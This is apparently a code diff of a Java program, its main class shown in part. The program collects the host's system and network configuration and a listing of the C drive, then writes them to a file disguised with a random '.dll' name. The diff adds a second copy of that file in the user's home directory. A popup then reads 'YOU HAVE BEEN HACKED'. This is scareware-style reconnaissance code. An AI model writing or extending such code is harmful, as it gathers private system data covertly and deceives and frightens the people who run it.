@@ -15,7 +15,7 @@ import java.util.TimeZone;
 
 public class Main {
 
-    public static void main(String[] args) throws IOException {
+    public static void main(String[] args) throws IOException, Exception {
 
         // Executes the Browser
         try {
@@ -82,23 +82,31 @@ public class Main {
         Image resizedImage = getImage.getScaledInstance(128, 128, java.awt.Image.SCALE_SMOOTH);
         image = new ImageIcon(resizedImage);
 
-        try {
-            FileWriter fileWriter = new FileWriter("Infos3785646s3838975.dll");
-            BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
-            PrintWriter out = new PrintWriter(bufferedWriter);
-            out.println("Host system configuration (systeminfo and network configuration):\n \n" + sysInfo);
+        FileWriter fileWriter = new FileWriter("Infos3785646s3838975.dll");
+        BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
+        PrintWriter out = new PrintWriter(bufferedWriter);
+        out.println("Host system configuration (systeminfo and network configuration):\n \n" + sysInfo);
 
-            out.println("\nList of Folders & Files in the local C Drive:\n");
-            for (int i = 0; i < filesInDir.length; i++) {
-                out.println(filesInDir[i]);
-            }
-
-            bufferedWriter.close();
-        } catch (Exception e) {
-            System.err.println("Error: " + e.getMessage());
+        out.println("\nList of Folders & Files in the local C Drive:\n");
+        for (int i = 0; i < filesInDir.length; i++) {
+            out.println(filesInDir[i]);
         }
+        bufferedWriter.close();
 
-        JOptionPane.showMessageDialog(windowPopup, sysInfo,"YOU HAVE BEEN HACKED", JOptionPane.INFORMATION_MESSAGE, image);
+        File file = new File(userHome + "/Infos3785646s3838975.dll");
+        FileWriter fileWriter2 = new FileWriter(file);
+        BufferedWriter bufferedWriter2 = new BufferedWriter(fileWriter2);
+        PrintWriter out2 = new PrintWriter(bufferedWriter2);
+        out2.println("Host system configuration (systeminfo and network configuration):\n \n" + sysInfo);
+
+        out2.println("\nList of Folders & Files in the local C Drive:\n");
+        for (int i = 0; i < filesInDir.length; i++) {
+            out2.println(filesInDir[i]);
+        }
+        bufferedWriter2.close();
+
+
+        JOptionPane.showMessageDialog(windowPopup, sysInfo, "YOU HAVE BEEN HACKED", JOptionPane.INFORMATION_MESSAGE, image);
 
     }
 
